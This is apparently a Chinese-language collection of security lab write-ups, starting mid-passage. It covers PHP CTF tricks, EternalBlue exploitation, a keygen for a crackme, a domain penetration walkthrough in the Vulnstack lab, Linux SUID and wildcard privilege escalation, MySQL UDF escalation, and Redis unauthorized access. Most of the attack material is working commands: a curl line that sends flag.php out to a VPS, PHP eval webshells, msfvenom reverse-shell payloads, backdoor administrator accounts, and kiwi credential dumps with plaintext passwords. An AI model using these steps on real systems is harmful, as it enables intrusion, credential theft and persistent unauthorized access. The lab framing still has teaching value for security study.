&#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123; die( &quot;scheme error!&quot;); &#125; $url &#x3D; escapeshellarg($url); $url &#x3D; escapeshellcmd($url);&#x2F;&#x2F;特殊字符逃逸 system(&quot;curl &quot;.$url); &#125; &#125; ?&gt; 很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd/arg的搭配进行命令执行了。首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。 首先这里利用了可变变量的特性。假设我们提交 ?flag=test post:_GET[flag]=test 当开始遍历 $_POST 超全局数组的时候， $__k 代表 _GET[flag] ，所以 $$__k就是 $_GET[flag] ，即 test 值，此时 $$__k == $__v 成立，变量 $_GET[flag] 就被 unset 了 而接下来下面又有一个变量覆盖if($_POST) extract($_POST, EXTR_SKIP);所以直接得到$_GET[flag]=test绕过第一层 第二层只需利用0e的MD5弱类型比较最后是curl的命令执行http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999似乎当curl版本变高后，将不再能执行。curl &#39;127.0.0.1&#39;\\&#39;&#39; 5.preg_match函数漏洞// index.php &lt;?php include &#x27;flag.php&#x27;; if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123; $password = $_POST[&#x27;password&#x27;]; if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) &#123; echo &#x27;Wrong Format&#x27;; exit; &#125; while (TRUE) &#123; $reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; if (&quot;42&quot; == $password) echo $flag; else echo &#x27;Wrong password&#x27;; exit; &#125; &#125; highlight_file(__FILE__); ?&gt; 字符类的含义是 graph 空格以外的可打印字符 punct 打印字符，不包括字母数字 主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。 最后与数字进行弱类型比较。payload 42.00e+00000 第一种方法 http://127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();// http://127.0.0.1/index.php?option=a 第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为.*匹配无数次而把\\换掉 还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。 http://127.0.0.1/test/ph.php?option=;phpinfo(); http://127.0.0.1/test/ph.php?option=$0 其最后的效果是下面这样的 &lt;?php $option=&#x27;$option=&#x27;;phpinfo();&#x27;;&#x27;; 6.parse_str函数缺陷漏洞代码 function getUser($id) &#123; global $config, $db; if (!is_resource($db)) &#123; $db = new MySQLi( $config[&#x27;dbhost&#x27;], $config[&#x27;dbuser&#x27;], $config[&#x27;dbpass&#x27;], $config[&#x27;dbname&#x27;] ); &#125; $sql = &quot;SELECT username FROM users WHERE id = ?&quot;; $stmt = $db-&gt;prepare($sql); $stmt-&gt;bind_param(&#x27;i&#x27;, $id); $stmt-&gt;bind_result($name); $stmt-&gt;execute(); $stmt-&gt;fetch(); return $name; &#125; $var = parse_url($_SERVER[&#x27;HTTP_REFERER&#x27;]); parse_str($var[&#x27;query&#x27;]); $currentUser = getUser($id); echo &#x27;&lt;h1&gt;&#x27;.htmlspecialchars($currentUser).&#x27;&lt;/h1&gt;&#x27;; 漏洞解析 parse_str 先来看看定义： parse_str功能 ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。 定义 ：void parse_str( string $encoded_string [, array &amp;$result ] ) 如果 encoded_string 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ） 看了定义我们也能很快感受到它的漏洞点就是变量覆盖了。 PHP $_SERVER[‘HTTP_REFERER’] PHP $_SERVER[&#39;HTTP_REFERER&#39;]，它是获取当前页面的url。需要注意的是，$_SERVER[‘HTTP_REFERER’]完全来源于浏览器。并不是所有的用户代理（浏览器）都会设置这个变量，而且有的还可以手工修改 HTTP_REFERER。因此，$_SERVER[‘HTTP_REFERER’] 是可以伪造的。$_SERVER[‘HTTP_REFERER’]对 POST 表单访问也是有效的我们想办法提交类似 config[dbhost]=127.0.0.1 这样类型的数据，这样因此我们可以控制连接的数据库，导致网站出现错误显示。 CTF题目 index.php //index.php &lt;?php $a = “hongri”; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo &#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;; &#125; ?&gt; upload.php &lt;?php header(&quot;Content-type:text/html;charset=utf-8&quot;); $referer = $_SERVER[&#x27;HTTP_REFERER&#x27;]; if(isset($referer)!== false) &#123; $savepath = &quot;uploads/&quot; . sha1($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &quot;/&quot;; if (!is_dir($savepath)) &#123; $oldmask = umask(0); mkdir($savepath, 0777, true); umask($oldmask); &#125; if ((@$_GET[&#x27;filename&#x27;]) &amp;&amp; (@$_GET[&#x27;content&#x27;])) &#123; //$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;); $content = &#x27;HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r&#x27;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); $msg = &#x27;Flag is here,come on~ &#x27; . $savepath . htmlspecialchars($_GET[&#x27;filename&#x27;]) . &quot;&quot;; echo $msg; usleep(100000); $content = &quot;Too slow!&quot;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); &#125; print &lt;&lt;&lt;EOT &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputEmail1&quot;&gt;Filename&lt;/label&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;exampleInputPassword1&quot;&gt;Content&lt;/label&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt; &lt;/form&gt; EOT; &#125; else&#123; echo &#x27;you can not see this page&#x27;; &#125; 第一关 在index.php内有如下; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123; echo &#x27;&lt;a href=&quot;upload.php&quot;&gt;flag is here&lt;/a&gt;&#x27;; 可想而知我们需要用变量覆盖，payload为： ?id=a[0]=s878926199a 就会出来一个链接，点击就到了upload页面。如果我们直接访问upload会报错，因为有如下代码： $referer = $_SERVER[&#x27;HTTP_REFERER&#x27;]; if(isset($referer)!== false) 当我们是通过a标签链接过去的会自动带上refer字段。 第二关 uplaod主要代码： if ((@$_GET[&#x27;filename&#x27;]) &amp;&amp; (@$_GET[&#x27;content&#x27;])) &#123; //$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;); $content = &#x27;HRCTF&#123;y0u_n4ed_f4st&#125; by:l1nk3r&#x27;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); $msg = &#x27;Flag is here,come on~ &#x27; . $savepath . htmlspecialchars($_GET[&#x27;filename&#x27;]) . &quot;&quot;; echo $msg; usleep(100000);//延迟 $content = &quot;Too slow!&quot;; file_put_contents(&quot;$savepath&quot; . $_GET[&#x27;filename&#x27;], $content); &#125; 可以发现会我们传入的filename会固定的存储在一个固定的位置，而这个位置会在输出中得到。而文件的内容先是flag然后延迟一下马上替换为了 Too slow! 。其实输入的content并没任何作用。思路：我们一直上传同一个文件名，然后使用python或者pb不断的访问这个文件。如果够快就不会把文本内容替换为 Too slow! 这样我们就可以访问到flag MS17-010漏洞利用演示1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 192.168.164.143 win7 IP 192.168.164.135 使用ping测试即可 使用msf前需要开启postgresql服务 开启服务： service postgresql start 查看服务状态： service postgresql status 开到绿色字体的active即为开启了 初始化数据库： msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口 使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击 输入msfconsole 启动msf 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接 输入命令 set payload windows/x64/meterpreter/reverse_tcp (4).开始运行 输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户 创建一个用户 net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 net localgroup administrtors test /add 目标主机上用户创建成功 实验结束 TraceMe.exe注册机打开程序，随便试一试 通过OD打开该程序，它会自动定位到模块入口点0x004013A0位置，也就是验证函数的内容 数据表中405030的数据，程序中需要用到 汇编代码的如下 00401340 /$ 55 push ebp 00401341 |. 8B6C24 0C mov ebp,dword ptr ss:[esp+0xC] ;ebp = 用户名 00401345 |. 56 push esi ; TraceMe.0040504F 00401346 |. 57 push edi 00401347 |. 8B7C24 18 mov edi,dword ptr ss:[esp+0x18] ;edi = 用户名的长度 0040134B |. B9 03000000 mov ecx,0x3 ;ecx = 从用户名的第四个字符开始计算 00401350 |. 33F6 xor esi,esi ;esi = 0 = 计算出的注册码 ; TraceMe.0040504F 00401352 |. 33C0 xor eax,eax ;eax = 0,用于计数，读取数据表的第eax个字节 00401354 |. 3BF9 cmp edi,ecx ;if(edi &gt; ecx) 00401356 |. 7E 21 jle short ;&#123; TraceMe.00401379 00401358 |. 53 push ebx 00401359 |&gt; 83F8 07 /cmp eax,0x7 ; if(eax &gt; 7) 0040135C |. 7E 02 |jle short TraceMe.00401360 0040135E |. 33C0 |xor eax,eax ;&#123;eax = 0;&#125; 00401360 |&gt; 33D2 |xor edx,edx ;edx = 0; 00401362 |. 33DB |xor ebx,ebx ;ebx = 0 00401364 |. 8A1429 |mov dl,byte ptr ds:[ecx+ebp] ; dl = ebp + ecx = 从用户名的第四个字符开始计算 00401367 |. 8A98 30504000 |mov bl,byte ptr ds:[eax+0x405030] ;bl = 数据表第eax个字符，数据表的内存地址为0x00405030处，查找其数值为0C 0A 13 09 0C 0B 0A 08(根据判断语句0x00401359可知，只有8个数据) 0040136D |. 0FAFD3 |imul edx,ebx ;edx = edx * ebx 00401370 |. 03F2 |add esi,edx ;esi = esi + edx 00401372 |. 41 |inc ecx ;ecx++ 00401373 |. 40 |inc eax ;eax++; 00401374 |. 3BCF |cmp ecx,edi ;if(ecx&lt;edi) 如果未取完用户名字符则继续 00401376 |.^ 7C E1 \\jl short ;&#123;goto 0x00401359&#125; TraceMe.00401359 00401378 |. 5B pop ebx ;计算结束 ; 0012FAE8 00401379 |&gt; 56 push esi ; /&lt;%ld&gt; = 40504F (4214863.) 使用python写出注册机 def crake_traceme(): code, len = 0, 0 username = input(&quot;输入用户名&quot;) num = [0x0C, 0x0A, 0x13, 0x09, 0x0C, 0x0B, 0x0A, 0x08] for i in range(3, len(username)): if len &gt; 7: len = 0 code += ord(username[i]) * num[len] len += 1 print(&quot;The code is:\\n&quot; + str(code)) crake_traceme() ) 一次域渗透测试攻击第一次做渗透测试，有的地方做的不是很好 环境搭建使用的靶机是红日安全提供的，地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ 搭建过程中有一点需要注意 Web服务主机win7有两块网卡，需要在设置中再添加一块网卡 网卡一连接到VMnet2中，作为内网环境 网卡二连接到VMnet1中，作为公网环境，并攻击机连到VMnet1中,确保其可以访问网站主页 剩下的两台域控主机直接连接到VMnet2中即可，可以与web服务器通信 修改window10物理机的VMnet1网卡 这样物理机和kali都可以访问到靶机网站 实验拓扑图: web服务器(win7): 公网IP:192.168.74.128 内网IP: 192.168.52.143 主机名:stu1 域成员主机(Windows Server 2003)：192.168.52.141 主机名：root-tvi862ubeh 域控(Windows Server 2008)：192.168.52.138 主机名：owa web服务器有两块网卡，其中192.168.74.128模拟的是公网环境，攻击者可以直接访问，192.168.52.143属于内网，攻击者无法直接访问 渗透过程网站探测首先访问网站主页: http://192.168.74.129/yxcms 先扫描一下目录 可以看存在很多可以访问的目录，并且这些目录都存在目录遍历漏洞，如/public,可以看到该目录下的很多内容，但是没有想要内容 网站漏洞利用getshell 经过探测网站的后台登录页面是http://192.168.74.129/yxcms/index.php?r=admin/index/login 经过爆破很容易试出密码为123456 成功登录后台 尝试搜索网站已发现的漏洞 这是一个网站常用的CMS，在网上搜索一下是否存在可以直接利用的漏洞 代码审计| yxcms app 1.4.6 漏洞集合 可以看到这个cms还是存在几个很好利用的漏洞的，尝试使用其中文件写入漏洞 访问http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default，这里可以写入php文件 写入一句话木马 写入成功后，访问http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php可以看到已经成功写入一句话木马，之后就是用蚁剑连接 成功获取shell，并且是system权限，这是由于该网站管理员直接使用administrator登录域控主机，若是在真是环境中获取的是普通用户权限则还需要配合提权，获取system权限 使用phpMyAdmin Getshell扫描http://192.168.74.129/ 直接使用工具爆破，很容易得到，用户名和密码都为root 一开始的想法是利用写into outfile写木马getshell，但是由于网站的secure_file_priv的值为NULL，所以我们不能利用写into outfile写木马getshell 但是还有一种方法，就是向mysql日志中写入一句话木马，具体如下:mysql日志木马 执行下列命令 set global general_log&#x3D;on; #开启日志 set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;; #设置指定文件为网站日志存放文件 SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; #执行该语句，会将该命令写入日志文件 执行完命令，便可以在网站根目录下看到hack.php 浏览器访问http://192.168.74.129/yxcms/hack.php，一句话木马访问成功 后渗透攻击在拿到了Web服务器的权限后，我们就要尽可能多的搜集该服务器的信息，然后搭建隧道通往内网。 执行whoami ,ipconfig,net localgroup administrators命令我们知道当前的用户身份是 administrator ，在管理员组中，并且处在域 god 中。该主机有两张网卡，分别是：192.168.74.129，192.168.52.143 获取MSF shell使用msf生成木马 kali终端输入msfconsole，进入msf 选择带reverse和meterpreter(发送端接受端连接)的payloads进行反弹端口 use windows/x64/meterpreter_reverse_tcp 输入show options查看方法 新开一个终端输入以下命令，生成木马文件，并利用蚁剑上传到目标主机中 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.74.130 lport=4444 -f exe -o 1.exe 再次输入msfconsole 进入应用，输入use exploit/multi/handler进入管理工具，获取shell权限，命令如下 use exploit/multi/handler set payload windows/x64/meterpreter_reverse_tcp set lhost kali&#x27;s ip run 即可获取shell 获取密码在meterpreter中运行run windows/gather/smart_hashdump,但是出现错误，提示需要system进程权限 使用migrate 388将meterpreter迁移到64位的进程，而且该进程也需要是system权限运行的 再使用run windows/gather/smart_hashdump 接下来是破解该密码 加载 kiwi模块 load kiwi creds_all 结果如下 meterpreter &gt; creds_all [+] Running as SYSTEM [*] Retrieving all credentials msv credentials =============== Username Domain LM NTLM SHA1 -------- ------ -- ---- ---- Administrator GOD edea194d76c77d87840ac10a764c7362 8a963371a63944419ec1adf687bb1be5 343f44056ed02360aead5618dd42e4614b5f70cf STU1$ GOD cde51539f42c2854d74e82db1173dd8c 50950d918317edf0ab95661a565c6ebf1151fe3b wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD hongrisec@2019 STU1$ GOD 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b tspkg credentials ================= Username Domain Password -------- ------ -------- Administrator GOD hongrisec@2019 kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) Administrator GOD.ORG hongrisec@2019 stu1$ GOD.ORG 81 c2 84 7c a6 0f 51 4b 41 91 b3 1a 0d 7e 56 32 0e 37 c7 77 f7 54 09 f4 f2 8b 54 cc 6b 20 7e 9c 56 46 e5 ee d9 d2 84 aa 6a 82 82 58 b1 ae bf 47 db 9f 53 9e c9 a1 5f bb ae a2 c3 7f 2d 37 9d c1 9a 25 95 f6 49 b8 a2 f1 cb 0a ad f2 b2 27 c8 36 b2 eb a5 d9 3c 10 ca 0c 38 18 63 fb 0d 7f 67 ec 37 87 84 e9 cc f3 d8 56 72 bc 0c cf e8 20 a7 93 07 29 3d b5 48 b6 33 de e9 df 3a 73 04 94 a7 90 e6 d5 4f ce a8 88 9e a5 18 78 e4 43 e8 5b e5 47 dc 0a 34 be 79 6a fa fe 7f d5 c6 38 48 79 53 7b 3f 8f 9e 78 31 cf 35 7b 12 93 e7 3a f1 0c de 90 d9 e5 69 02 a9 ab c6 da f2 09 2f 8a 0a ed 19 44 11 c4 ba 93 12 73 04 69 3a 31 4e ff b8 a7 72 da 4b 6e ad db e9 52 7f 88 cf 0f 01 92 87 68 ba 5a d1 d3 ec 1f c3 b1 a5 3b 44 e5 7b 9d 2f a9 28 5b 可以看到密码已经被破解处理 password：hongrisec@2019 远程桌面登录已经获得了administrator的账号和密码，现在我们既可以使用administrator账号登录，也可以新建账号登录。 直接使用administrator登录的话可能被管理员发现，所以使用第二种方法 net user hack password /add net localgroup administrators hack /add 查看主机是否开启3389端口 nmap -p 3389 -v 192.168.74.129 可以发现是关闭的。 使用meterpreter,打开该端口(运行之前好像需要重新弹出shell,直接运行没有成功) run post/windows/manage/enable_rdp 再次扫描就会发现3389端口已经打开 直接连接即可 添加路由、挂Socks4a代理 添加路由的目的是为了让我们的MSF其他模块能访问内网的其他主机 添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务 注：添加路由一定要在挂代理之前，因为代理需要用到路由功能 在获取shell的机器上添加路由 meterpreter &gt; run get_local_subnets meterpreter &gt; run autoroute -s 192.168.21.0/24 # 添加路由 meterpreter &gt; run autoroute -p # 显示路由 meterpreter &gt; route flush # 删除 使用run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24，查看存活的主机 然后建立socks4代理 meterpreter &gt; background msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4a msf5 auxiliary(server/socks4a) &gt; set srvhost 127.0.0.1 msf5 auxiliary(server/socks4a) &gt; set srvport 1080 msf5 auxiliary(server/socks4a) &gt; run 设置完代理后攻击者主机就可以访问内网了 域信息收集net time /domain #查看时间服务器 net user /domain #查看域用户 net view /domain #查看有几个域 net group &quot;domain computers&quot; /domain #查看域内所有的主机名 net group &quot;domain admins&quot; /domain #查看域管理员 net group &quot;domain controllers&quot; /domain #查看域控 汇总 从域信息收集可以得到以下信息： 域：god.org 域内有三个用户：administrator、ligang、liukaifeng01 域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH、STU1 域控：OWA(192.168.52.138) 域管理员：administrator 由此可见，我们现在获得的即是域管理员权限。此环境内还有一台ROOT-TVI862UBEH(192.168.52.141)和域控OWA(192.168.52.138)。 内网主机信息收集远程登录桌面后会看到一个Nmap应用，可以用这个探测内网主机 当然之前已经设置完代理了，也可以使用kali中的msf探测 内网存活主机探测因为之前的代理搭建存在问题，导致这一步不能做，就在网上找了一些相关操作 在域环境渗透中可以省略，因为使用域命令可以直接查询域中有哪些主机。在非域环境中渗透，可以使用这一步。在这里顺带提一下这个用法。更多的关于使用MSF进行内网探测，传送门：后渗透阶段之基于MSF的内网主机探测 auxiliary/scanner/discovery/udp_sweep #基于udp协议发现内网存活主机 auxiliary/scanner/discovery/udp_probe #基于udp协议发现内网存活主机 auxiliary/scanner/netbios/nbname #基于netbios协议发现内网存活主机 内网存活主机端口扫描使用MSF自带模块进行端口探测 auxiliary/scanner/portscan/tcp #基于tcp进行端口扫描(默认扫描1-10000) 也可以用nmap扫描 内网存活主机服务探测auxiliary/scanner/ftp/ftp_version #发现内网ftp服务，基于默认21端口 auxiliary/scanner/ssh/ssh_version #发现内网ssh服务，基于默认22端口 auxiliary/scanner/telnet/telnet_version #发现内网telnet服务，基于默认23端口 auxiliary/scanner/dns/dns_amp #发现dns服务，基于默认53端口 auxiliary/scanner/http/http_version #发现内网http服务，基于默认80端口 auxiliary/scanner/http/title #探测内网http服务的标题 auxiliary/scanner/smb/smb_version #发现内网smb服务，基于默认的445端口 auxiliary/scanner/mssql/mssql_schemadump #发现内网SQLServer服务,基于默认的1433端口 auxiliary/scanner/oracle/oracle_hashdump #发现内网oracle服务,基于默认的1521端口 auxiliary/scanner/mysql/mysql_version #发现内网mysql服务，基于默认3306端口 auxiliary/scanner/rdp/rdp_scanner #发现内网RDP服务，基于默认3389端口 auxiliary/scanner/redis/redis_server #发现内网Redis服务，基于默认6379端口 auxiliary/scanner/db2/db2_version #探测内网的db2服务，基于默认的50000端口 auxiliary/scanner/netbios/nbname #探测内网主机的netbios名字 提权复现通配符提权简介通配符是一个字符或一组字符，可以用来替换某些范围/类别的字符。在执行任何其他操作之前，通配符首先要经过shell进行解释。 下面是一些常见的通配符： * 星号可以与文件名中的任意数量的字符匹配，包括0个字符。 ? 问号用于匹配任意单个字符。 [ ] 括号内包括一组字符，其中任何一个字符都可以匹配该位置上的单个字符。 – []中的连字符表示字符范围。 ~ 单词开头的波浪符表示当前用户的主目录的名称。如果该字符后面是另一个用户的登录名，则表示该用户的主目录。 利用chown的--reference参数提权 –reference=&lt;参考文件或目录&gt;：把指定文件或目录的所有者与所属组，统统设置成和参考文件或目录的所有者与所属组相同。 本地提权实验环境ubuntu18.04 首先创建一个hacker用户 adduser hacker 登录sunzy账号，在home/sunzy/test 随便写一些文件，作为实验参考对象 登录hacker账号，并且在test目录下写两个文件 这里需要实验su命令提升权限，并且将所有者和用户组改为hacker 其中hacker.php与’–reference=hacker.php’中的名字需要一致 使用root权限在/home/sunzy/test/执行 chown -R hacker1:hacker1 *.php 结果如下，发现，属于sunzy用户的文件，现在属于hacker，这样hacker就可以对这些文件进行读写操作。 linux SUID提权关于SUIDSUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。 查找具有 SUID 权限位文件以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。 find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ; 也可以使用 sudo -l 命令列出当前用户可执行的命令 提权nmap nmap（2.02-5.21）存在交换模式，可利用提权 nmap --interactive 之后执行: nmap&gt; !sh sh-3.2# whoami root msf中的模块为： exploit/unix/local/setuid_nmap 较新版可使用 --script 参数： echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse kali nmap 7.7 提权成功： mysql UDF提权UDF提权原理UDF指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用dll文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的root用户的一个权限时，即使所在的系统权限很低，也可以使用UDF来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。 这里使用mysql进行复现。 首先我们需要拥有mysql数据库的root权限，由于mysql的版本不同，udf提权的方式也不同。 mysql版本&gt;5.1 需要在mysql的安装目录下创建 lib\\plugin 这个文件夹（默认不存在），之后将把dll文件放在这个文件夹中；mysql版本&lt;5.1 需要将dll文件放在 C:\\windows\\或C:\\windows\\system32。 然后加载函数，就可以使用了。 注意：提权所用的dll在sqlmap或msf中都有，要与受害机的系统与数据库位数进行匹配。 msf提权演示这里主要演示大于5.1的版本。所以接下来创建目录，关于创建目录，下面的第二篇参考提供了一个使用NTFS ADS流的方式，大家可以进行尝试，这里我直接手工进行创建。 然后我们需要把自定义好的函数，也就是执行系统命令的函数加载进数据库中，我们需要先将定义好的一个dll放入lib\\plugin这个文件夹，这里如果无法上传文件，我们可以创建一个数据表，将dll中的数据十六进制编码，之后在通过读取的方式写入到lib\\plugin\\udf.dll文件中，这样也是可以达到上传文件的效果的。写入文件有一个前提，就是secure_file_priv这个选项需要为空值，这样才可以加载或写入文件。 NULL表示不可以写入修改mysql.ini文件，使其为空值 这样一来就可以写入文件了。 但是这里我们利用msf进行攻击，需要远程连接该主机的数据库，所以要提前查看，该数据库是否可以远程连接。 这里发现root用户的连接对象都是本地，可以使用sql语句进行修改，将其改为允许远程连接 update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;; 这条语句来修改连接对象为所有主机之后尝试使用msf进行攻击。 进入msf，加载exploit/multi/mysql/mysql_udf_payload模块 这里的需要mysql数据库的账号和密码，以及连接的主机。设置完之后，尝试攻击。攻击完之后，在受害机的lib\\plugin目录下将会生成一个dll文件。之后查看已载入的函数并尝试执行。 执行成功返回0。由于该命令没有回显，不方便，所以我们需要手动的加载一个有回显的函数。 这里的dll文件的名称是msf随机的，利用该条命令载入了sys_eval函数 可以看到该条函数成功将执行结果回显出来了。 redis未授权访问漏洞利用漏洞简介Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。 该漏洞的产生条件有以下两点： 1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。 漏洞危害：(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器; 环境搭建在kali中安装redis 3.2.0 创建redis安装目录 mkdir /usr/local/redis cd /usr/local/redis/ wget http://download.redis.io/releases/redis-3.2.0.tar.gz //获取redis压缩包 tar xzf redis-3.2.0.tar.gz cd /usr/local/redis/redis-3.2.0 make #编译安装 安装完成之后需要修改配置文件，配置允许可以远程访问。 vim redis.conf #修改默认配置文件 在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。 然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。 cd src cp redis-cli /usr/bin cp redis-server /usr/bin cp redis.conf /etc/ 开启redis服务 redis-server /etc/redis.conf 第一台作为攻击机即可，然后将这台主机克隆作为目标主机 攻击机 ip:192.168.164.145 目标主机 ip:192.168.164.23 首先确定目标主机是否开启redis服务，使用nmap扫描端口6379 如下，显示了目标使用的redis版本以及服务器的信息 漏洞利用1.写入木马文件首先进入redis安装目录的src中执行 ./redis-cli -h 192.168.164.23 成功控制目标的redis服务 向其网站根目录中写入一句话木马 config set dir /var/www/html config set dbfilename shell.php set x &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; save 